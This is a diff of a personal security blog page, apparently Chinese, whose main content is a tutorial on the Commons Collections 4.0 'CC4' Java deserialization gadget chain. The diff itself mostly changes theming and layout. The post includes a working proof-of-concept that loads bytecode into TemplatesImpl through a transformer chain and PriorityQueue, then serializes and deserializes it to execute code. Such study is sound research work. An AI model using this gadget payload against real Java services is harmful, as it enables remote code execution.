@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>CC4链 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/03/24/CC4%E9%93%BE/">
+<link rel="canonical" href="https://curlysean.github.io/2025/03/24/CC4%E9%93%BE/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-03-24T04:13:04.000Z">2025.03.24</time></div>
-      <div><span>更新</span><time datetime="2025-03-24T04:13:04.000Z">2025.03.24</time></div>
-      <div><span>阅读</span><strong>14 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Axna2"><span class="toc-text">CC4链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nAbc8"><span class="toc-text">CC4攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dfZTG"><span class="toc-text">调用transform方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OCbWk"><span class="toc-text">调用compare</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tzKwQ"><span class="toc-text">小芝士：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RlZd7"><span class="toc-text">后续调整</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VMeEP"><span class="toc-text">自己思考与尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#p1qOE"><span class="toc-text">实际</span></a></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nAbc8"><span class="toc-text">CC4攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dfZTG"><span class="toc-text">调用transform方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OCbWk"><span class="toc-text">调用compare</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tzKwQ"><span class="toc-text">小芝士：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RlZd7"><span class="toc-text">后续调整</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VMeEP"><span class="toc-text">自己思考与尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#p1qOE"><span class="toc-text">实际</span></a></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-03-24T04:13:04.000Z">2025.03.24</time></div>
+        <div><span>更新</span><time datetime="2025-03-24T04:13:04.000Z">2025.03.24</time></div>
+        <div><span>阅读</span><strong>约 5 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="Axna2">CC4链</h1>
+        
 之前讲的几条链子，都是在commons-collections3.2.1版本之前的攻击链，cc4是在commons-collections4.0版本中的一条链子
 
 <p>实际上，这条链子还是换汤不换药，只是中间执行的方式换了一下，后面还是命令执行和代码执行两种方式</p>
@@ -142,7 +163,7 @@
 <h3 id="VMeEP">自己思考与尝试</h3>
 但是运行后却无视发生，应该是在链子运行时有一些条件导致链子没有完整的走下来，我们可以通过动态调试来找到问题出处
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794089444-92a1ac26-438b-4c35-8741-ad4ff460665f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794089444-92a1ac26-438b-4c35-8741-ad4ff460665f.png" alt="CC4链" loading="lazy"></p>
 <p>最后在这里发现，由于size的原因，并没有走到<code>siftDown</code>方法内，由于size无符号右移以后，为零，所以并没有进行遍历操作，因此我想我们可以通过反射修改size的值为2就可以进行遍历操作</p>
 <blockquote>
 <p><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">&gt;&gt;&gt; : 无符号右移，忽略符号位，空位都以0补齐</font></p>
@@ -152,8 +173,8 @@
 <p>反射修改如下，修改后成功执行</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">PriorityQueue</span>&gt; aClass = priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794482096-4a86661d-c386-45fd-8975-9e7a8fede2a5.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794516690-2b97352d-4456-4fd2-93d1-71fee6ac7cde.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794482096-4a86661d-c386-45fd-8975-9e7a8fede2a5.png" alt="CC4链" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794516690-2b97352d-4456-4fd2-93d1-71fee6ac7cde.png" alt="CC4链" loading="lazy"></p>
 <h3 id="p1qOE">实际</h3>
 在这个地方，白日梦组长是向其中add了两个东西，使他的size变为2，但是在这里add方法也会触发compare方法，就是我们说的cc1的老毛病，也是可以构造时传入无用的东西，等add完成后反射修改回去
 
@@ -162,7 +183,7 @@
 <p>将反射改为add方法后，也可以成功弹出计算器</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740629922114-eb8aca3d-7b1e-4604-a10d-63c1e51d7fc3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740629922114-eb8aca3d-7b1e-4604-a10d-63c1e51d7fc3.png" alt="CC4链" loading="lazy"></p>
 
       </div>
       
@@ -178,13 +199,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/03/24/CC2%E9%93%BE/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>CC2链</strong>
       </a>
     
     
-      <a href="/2025/03/24/CC3%E9%93%BE%E8%A1%A5%E5%85%85/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/03/24/CC3%E9%93%BE%E8%A1%A5%E5%85%85/">
+        <span>更早一篇</span>
         <strong>CC3链补充</strong>
       </a>
     
@@ -198,9 +219,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
